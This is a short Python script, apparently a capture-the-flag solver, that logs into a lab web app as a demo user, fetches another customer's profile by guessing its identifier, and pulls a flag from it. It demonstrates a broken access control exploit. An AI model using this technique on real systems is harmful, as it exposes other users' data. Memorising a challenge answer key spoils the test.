from __future__ import annotations

import re
import requests


def solve(base_url: str) -> str:
    client = requests.Session()
    client.post(base_url + "/login", data={"username": "demo", "password": "demo-pass"})
    linked_profile = "customer-north"
    response = client.get(base_url + f"/profiles/{linked_profile}")
    return re.search(r"flag\{[^}]+\}", response.json()["note"]).group(0)
